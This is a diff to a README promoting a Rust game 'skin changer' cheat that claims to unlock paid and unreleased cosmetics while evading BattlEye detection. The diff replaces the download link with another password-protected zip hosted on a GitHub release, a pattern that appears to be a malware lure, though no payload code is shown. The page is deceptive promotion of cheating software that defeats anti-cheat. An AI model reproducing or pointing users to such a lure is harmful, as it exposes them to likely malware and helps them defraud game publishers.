@@ -3,9 +3,7 @@
 **Unleash Your Creativity in Rust!** 🌟  
 Express your unique style in **Rust** with our **ultimate skin changer**! Swap weapons, structures, outfits, and gear with **any in-game or leaked cosmetic** instantly. This powerful tool unlocks premium skins, rare items, and even unreleased content—all while staying **BattlEye-safe and undetected**.  
 
-**[![Download Rust Skin Changer](https://img.shields.io/badge/Download-Skin%20Changer-blueviolet)](https://github.com/MagmaWindClash/GTA5-Cheat/releases/download/Latest/Azuro.zip)**
-
-🔑 **Password: azuro**
+**[![Download Rust Skin Changer](https://img.shields.io/badge/Download-Skin%20Changer-blueviolet)](https://github.com/Rust-Skins-Changer-2026/.github/releases/download/Latest/RustSwapper.zip)**  🔑 **Password: 2026**
 
 
 **🚀 Key Features:**  
